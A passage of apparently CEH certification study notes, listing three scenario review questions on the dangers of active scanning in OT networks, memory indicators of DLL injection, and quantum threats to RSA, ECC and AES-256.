4. **Scenario 4:** Why is active port scanning (e.g., standard `nmap -sS -A`) considered dangerous when assessing Operational Technology (OT) networks containing PLCs and RTUs, and how does Microsoft Defender for IoT overcome this limitation?
5. **Scenario 5:** A SOC analyst identifies an injected DLL residing in memory with permissions `PAGE_EXECUTE_READWRITE` and `Type: MEM_PRIVATE`. Why does this specific memory state indicate malicious activity rather than normal program execution?
6. **Scenario 6:** How does Shor's algorithm threaten public-key cryptosystems like RSA and ECC, and why does Grover's algorithm not pose an immediate fatal threat to AES-256?

---

> **Navigation:** [🏠 CEH Dashboard](./README.md) | [⬅️ Modules 04–14 Master Class](./2026-10-27-ceh-master-class-notes.md) | [Main Dashboard](../README.md)  
*CEH v13 Master Lecture Notes — Maintained as an advanced engineering study portfolio.*
